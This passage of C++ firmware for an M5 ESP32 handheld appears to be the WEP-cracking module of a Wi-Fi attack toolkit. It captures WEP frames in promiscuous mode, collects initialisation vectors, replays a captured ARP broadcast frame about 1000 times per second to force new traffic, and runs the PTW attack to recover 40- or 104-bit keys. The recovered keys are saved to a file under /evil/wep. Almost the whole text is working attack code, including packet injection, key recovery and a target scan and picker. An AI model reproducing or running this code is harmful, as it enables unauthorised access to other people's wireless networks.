    uiFooter("DEL quit   ENTER toggle replay");
  };
  auto drawLiveCap = [&]() {
    auto& d = M5.Display; int W = wcW();
    d.setTextSize(1.5);
    // votes 40 bits (tout trafic) et 104 bits (ARP) = ce qui fait casser
    d.setTextColor(WC_ACC, WC_BG);  d.setCursor(6, 38);   d.printf("40b %-6lu", (unsigned long)g_dataVotes);
    d.setTextColor(WC_WARN, WC_BG); d.setCursor(132, 38); d.printf("104b %-5lu", (unsigned long)g_arpVotes);
    float fr = (float)g_dataVotes / (float)IV_GOAL; if (fr > 1) fr = 1;   // jauge 40 bits (croit)
    int fw = (int)((W - 16) * fr);
    if (fw > 0) d.fillRoundRect(8, 58, fw, 8, 1, fr >= 1 ? WC_OK : WC_ACC);
    d.fillRect(0, 74, W, 14, WC_BG);                            // bande chips : efface puis redessine
    uiChip(6, 74,  g_haveArp ? "ARP OK" : "ARP..",   g_haveArp ? WC_OK : WC_WARN);
    uiChip(66, 74, replay ? "REPLAY ON" : "REPLAY",  replay ? WC_OK : WC_GREY);
    uiChip(152, 74, assoc ? "ASSOC" : "NO-ASSOC",    assoc ? WC_OK : WC_GREY);
    d.setTextSize(1.5); d.setTextColor(WC_WHITE, WC_BG); d.setCursor(6, 92);
    d.printf("iv %-6lu tx %-5lu", (unsigned long)g_uniqIv, (unsigned long)g_replayTx);
    d.setTextColor(WC_GREY, WC_BG); d.setCursor(6, 104);
    d.printf("t %-4lus heap %-3uk %c", (unsigned long)((millis() - t0) / 1000),
             (unsigned)(ESP.getFreeHeap() / 1024), spinChar());
    g_spin++;
  };
  auto draw = [&]() {
    int view = g_cracked ? 1 : 0;
    if (view != lastView) { if (view) drawStaticCracked(); else drawStaticCap(); lastView = view; }
    if (!view) drawLiveCap();
  };
  draw();

  while (true) {
    M5.update(); cardUpdate();

    // drain : IV + pcap + votes PTW (unique) + echantillons + detection ARP
    while (g_qTail != g_qHead) {
      Frame& fr = g_q[g_qTail]; g_qTail = (uint16_t)((g_qTail + 1) % WEP_CAPQ);
      const uint8_t* p = fr.data; uint16_t len = fr.len;
      g_rxData++; g_rxWep++;
      int hl = hdrLen(p);
      int enc = (int)len - hl - 4;                  // octets chiffres (ICV + FCS inclus ; l'ESP32 inclut le FCS)
      if (enc >= 10) {
        uint32_t iv = (uint32_t)p[hl] | ((uint32_t)p[hl + 1] << 8) | ((uint32_t)p[hl + 2] << 16);
        g_totIv++;
        bool isNew = !bloomSeenAdd(iv);
        if (isNew) {
          g_uniqIv++;
          const uint8_t* ct = p + hl + 4;
          uint8_t ivb[3] = { p[hl], p[hl + 1], p[hl + 2] };
          capFrame(p, (uint16_t)(len - 4));          // pcap sans FCS
          // (1) vote COURT sur TOUTE trame WEP : SNAP 6 octets surs -> 4 premiers octets de cle
          uint8_t ks6[6]; for (int k = 0; k < 6; k++) ks6[k] = ct[k] ^ SNAP6[k];
          ptwAddN(ivb, ks6, 4);
          g_dataVotes++;
          // garde un echantillon (trame assez grande : SNAP+payload+ICV) pour la verif ICV
          if (g_nsamp < WEP_NSAMP && enc >= 28 && enc <= 76) {
            uint8_t* sm = &g_samp[g_nsamp * 80];
            sm[0] = p[hl]; sm[1] = p[hl + 1]; sm[2] = p[hl + 2]; sm[3] = p[hl + 3];
            int cp = enc > 76 ? 76 : enc; memcpy(sm + 4, ct, cp);
            g_sampLen[g_nsamp] = (uint8_t)enc; g_nsamp++;
          }
          // (2) vote COMPLET sur ARP (enc 40 data +ICV, +4 FCS) -> les 13 octets (104 bits)
          bool arpLike = (enc == 40 || enc == 44);
          if (arpLike) {
            uint8_t ks[15]; for (int k = 0; k < 15; k++) ks[k] = ct[k] ^ ARP_KNOWN[k];
            ptwAddN(ivb, ks, 13);
            g_arpVotes++;
            uint8_t tods = p[1] & 0x01; const uint8_t* a3 = p + 16;
            if (!g_haveArp && tods && isBcast(a3)) {  // garde pour l'ARP-replay (sans FCS)
              int cl = (int)len - 4; if (cl > WEP_FRMAX) cl = WEP_FRMAX;
              memcpy(g_arp, p, cl); g_arpLen = (uint16_t)cl; g_haveArp = true;
            }
          }
        }
      }
    }
    if (g_cap && millis() - lastFlush > 1000) { g_cap.flush(); lastFlush = millis(); }  // SD flush: 1x/s, not every loop

    // ARP replay
    if (replay && g_haveArp && millis() - lastTx >= 1) {   // ~1000 replays/s -> IV frais plus vite
      esp_wifi_80211_tx(WIFI_IF_STA, g_arp, g_arpLen, false);
      esp_wifi_80211_tx(WIFI_IF_STA, g_arp, g_arpLen, false); // burst x2
      g_replayTx += 2; lastTx = millis();
    }

    // light auto-crack at VOTE MILESTONES (data votes drive 40-bit ; silent ~50 ms, no flicker)
    if (!g_cracked && g_dataVotes >= nextCrackIv) {
      nextCrackIv = g_dataVotes + 5000;             // next attempt after +5000 votes
      if (ptwCrack(false)) saveKey(t);
      draw();                                       // shows the green result card on success
    }

    if (millis() - lastDraw > 250) { draw(); lastDraw = millis(); }

    if (kp(KEY_ENTER)) { keyRelease(); replay = !replay; draw(); }
    if (kp('r') || kp('R')) { keyRelease(); g_uniqIv = g_totIv = g_arpVotes = g_dataVotes = 0;
      g_nsamp = 0; g_cracked = false; nextCrackIv = 15000;
      memset(g_bloom, 0, WEP_BLOOM_BYTES); memset(g_votes, 0, (size_t)WEP_KL * 256 * sizeof(uint16_t));
      lastView = -1; draw(); }
    if ((kp('c') || kp('C')) && !g_cracked) {
      keyRelease();
      banner("Deep crack...", "PTW + key-ranking (please wait)");
      esp_wifi_set_promiscuous(false);             // stop RX flood during crack (anti-watchdog)
      bool ok = ptwCrack(true);
      esp_wifi_set_promiscuous(true);              // resume capture
      esp_wifi_set_promiscuous_filter(&f);
      esp_wifi_set_channel(t.ch, WIFI_SECOND_CHAN_NONE);
      if (ok) saveKey(t);
      else banner("Not yet", "more IVs needed");
      if (!ok) { for (int i = 0; i < 30; i++) { M5.update(); cardUpdate(); if (kpAny()) break; delay(40); } keyRelease(); }
      lastView = -1; draw();
    }
    if (kp(KEY_BACKSPACE) || kp('`')) { keyRelease(); break; }
    delay(1);                                              // boucle plus serree -> draine le ring plus vite
  }

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  if (g_cap) { g_cap.flush(); g_cap.close(); }
  if (g_cracked) banner("Key saved", "/evil/wep/wep-keys.txt");
  else           banner("Capture saved", "/evil/wep/ -> aircrack-ng (PTW)");
  for (int i = 0; i < 40; i++) { M5.update(); cardUpdate(); if (kpAny()) break; delay(40); }
  keyRelease();
}

// ---------------------------------------------------------------------------
//  Entree menu
// ---------------------------------------------------------------------------
inline void menu() {
  crcInit();
  g_q     = (Frame*)malloc(sizeof(Frame) * WEP_CAPQ);
  g_bloom = (uint8_t*)calloc(WEP_BLOOM_BYTES, 1);
  g_votes = (uint16_t*)calloc((size_t)WEP_KL * 256, sizeof(uint16_t));
  g_samp  = (uint8_t*)malloc((size_t)WEP_NSAMP * 80);
  if (!g_q || !g_bloom || !g_votes || !g_samp) {
    if (g_q) free(g_q); if (g_bloom) free(g_bloom); if (g_votes) free(g_votes); if (g_samp) free(g_samp);
    g_q = nullptr; g_bloom = nullptr; g_votes = nullptr; g_samp = nullptr;
    banner("WEP: OOM", "not enough RAM");
    for (int i = 0; i < 30; i++) { M5.update(); cardUpdate(); if (kpAny()) break; delay(40); } keyRelease(); return; }

  std::vector<Target> targets;
  scanWep(targets);
  int sel = pickTarget(targets);
  if (sel >= 0) captureLoop(targets[sel]);

  teardownRadio();                 // etat radio propre (coexistence BLE)
  free(g_q);     g_q = nullptr;
  free(g_bloom); g_bloom = nullptr;
  free(g_votes); g_votes = nullptr;
  free(g_samp);  g_samp = nullptr;
}

} // namespace wep
